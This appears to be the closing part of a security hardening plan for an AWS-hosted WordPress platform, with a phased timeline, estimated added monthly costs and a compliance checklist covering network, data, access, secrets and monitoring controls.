| Phase 1 | Secrets, Terraform, HTTPS | Week 1 | 8-12 hours |
| Phase 2 | WAF, Scanning, SSH | Week 2 | 6-10 hours |
| Phase 3 | Logging, Monitoring | Week 3 | 4-6 hours |
| Phase 4 | Hardening | Week 4 | 4-8 hours |
| **Total** | | **4 weeks** | **22-36 hours** |

---

## Budget Impact

| Service | Additional Monthly Cost |
|---------|------------------------|
| AWS Secrets Manager | ~$1-5/month |
| AWS WAF | ~$5-20/month |
| CloudWatch Logs | ~$5-15/month |
| ACM Certificate | FREE |
| **Total Additional** | **~$11-40/month** |

---

## Security Compliance Checklist

### Network Security
- [ ] VPC with public/private subnet separation
- [ ] Security groups with least privilege
- [ ] No direct internet access to private resources
- [ ] VPC Flow Logs enabled
- [ ] AWS WAF enabled

### Data Security
- [ ] EFS encryption at rest
- [ ] EFS encryption in transit
- [ ] RDS encryption at rest
- [ ] Container image encryption
- [ ] Database backup encryption verification
- [ ] EFS backup solution

### Access Control
- [ ] OIDC for GitHub Actions (no long-lived credentials)
- [ ] IAM roles for ECS tasks
- [ ] SSM for EC2 access
- [ ] MFA for privileged access
- [ ] Regular IAM policy review

### Application Security
- [ ] Non-root container user
- [ ] Security headers in Nginx
- [ ] ECR image scanning
- [ ] Trivy/CI scanning
- [ ] WordPress security plugin

### Secrets Management
- [ ] Sensitive Terraform variables marked
- [ ] No hardcoded secrets in code
- [ ] AWS Secrets Manager for DB password
- [ ] GitHub Secrets for pipeline

### Monitoring & Incident Response
- [ ] CloudWatch Logs enabled
- [ ] ECS Container Insights
- [ ] CodeDeploy deployment tracking
- [ ] Security-specific CloudWatch alarms
- [ ] Incident response plan

---

**Remember**: Security is not optional. One vulnerability can compromise the entire platform. When in doubt, err on the side of caution.
